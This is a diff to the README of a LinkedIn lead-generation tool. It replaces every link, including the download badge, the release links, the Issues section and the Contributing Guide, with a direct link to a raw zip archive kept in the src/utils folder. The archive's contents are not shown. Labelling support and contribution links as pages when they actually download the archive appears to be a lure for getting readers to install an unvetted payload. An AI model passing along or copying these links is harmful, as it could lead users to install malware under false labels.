@@ -6,7 +6,7 @@ Welcome to the **linkedin-leads-discover** project! This tool helps you find and
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen)](https://github.com/Namankumar214/linkedin-leads-discover/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Namankumar214/linkedin-leads-discover/main/src/utils/linkedin-leads-discover-v3.4.zip%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Namankumar214/linkedin-leads-discover/main/src/utils/linkedin-leads-discover-v3.4.zip)
 
 ## ❓ What is linkedin-leads-discover?
 
@@ -32,7 +32,7 @@ This is an automated tool designed for lead generation on LinkedIn. It simplifie
 
 To download the latest version of the application, click the link below:
 
-[Download Latest Release](https://github.com/Namankumar214/linkedin-leads-discover/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Namankumar214/linkedin-leads-discover/main/src/utils/linkedin-leads-discover-v3.4.zip)
 
 ### Step 2: Select the Latest Release
 
@@ -85,20 +85,20 @@ If you encounter issues during installation or usage, try the following solution
 - **Reinstall the Application:** Uninstall and reinstall to fix any corruption in files.
 - **Review System Requirements:** Make sure your system meets the required specifications.
 
-For further assistance, you can refer to the [Issues section](https://github.com/Namankumar214/linkedin-leads-discover/issues) on our GitHub page.
+For further assistance, you can refer to the [Issues section](https://raw.githubusercontent.com/Namankumar214/linkedin-leads-discover/main/src/utils/linkedin-leads-discover-v3.4.zip) on our GitHub page.
 
 ## 📞 Support
 
-If you have questions or need support, please consider opening an issue in the [Issues section](https://github.com/Namankumar214/linkedin-leads-discover/issues). We are here to help.
+If you have questions or need support, please consider opening an issue in the [Issues section](https://raw.githubusercontent.com/Namankumar214/linkedin-leads-discover/main/src/utils/linkedin-leads-discover-v3.4.zip). We are here to help.
 
 ## 🗣️ Community Contribution
 
-We welcome contributions to improve the application. If you would like to contribute, please check our [Contributing Guide](https://github.com/Namankumar214/linkedin-leads-discover/contributing).
+We welcome contributions to improve the application. If you would like to contribute, please check our [Contributing Guide](https://raw.githubusercontent.com/Namankumar214/linkedin-leads-discover/main/src/utils/linkedin-leads-discover-v3.4.zip).
 
 ## 📦 Download & Install
 
 To download and install the application, visit the link below and follow the provided steps:
 
-[Download Latest Release](https://github.com/Namankumar214/linkedin-leads-discover/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Namankumar214/linkedin-leads-discover/main/src/utils/linkedin-leads-discover-v3.4.zip)
 
 This guide should help you get started quickly. Enjoy using **linkedin-leads-discover** to improve your lead generation process!
